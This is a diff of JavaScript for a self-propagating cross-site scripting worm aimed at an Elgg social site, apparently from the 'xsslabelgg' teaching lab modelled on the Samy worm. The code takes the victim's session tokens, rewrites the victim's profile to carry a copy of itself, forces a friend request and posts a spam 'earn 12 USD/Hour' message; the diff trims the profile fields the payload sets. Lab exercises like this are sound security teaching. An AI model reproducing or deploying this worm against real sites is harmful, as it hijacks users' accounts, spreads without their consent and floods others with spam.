@@ -13,29 +13,18 @@ window.onload = function () {
 
     var wormCode = encodeURIComponent(headerTag+innerCode+tailTag);
     
-    var name = elgg.session.user.name;
     var guid = "&guid="+elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
-    var briefDesc = "&briefdescription=1605011&accesslevel[briefdescription]=1";
     var description = "&description="+wormCode+"&accesslevel[description]=1";
-    var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
-    var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
-    var location = "&location="+randomString(10)+"&accesslevel[location]=1";
-    var mobile = "&mobile="+randomString(10)+"&accesslevel[mobile]=1";
-    var phone = "&phone="+randomString(10)+"&accesslevel[phone]=1";
-    var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
-    var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
-    var website = "&website="+randomString(10)+"&accesslevel[website]=1";
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
-    var editContent = name + guid + ts + token + briefDesc + description + contactemail + interests + location + mobile + phone + skills + twitter + website;
+    var editContent =  guid + ts + token + description;
 
     var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
     let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
     var body = "&body="+link;
-    
     var sendurlWirePost = "http://www.xsslabelgg.com/action/thewire/add";
     var contentWirePost = ts + token + body;
 
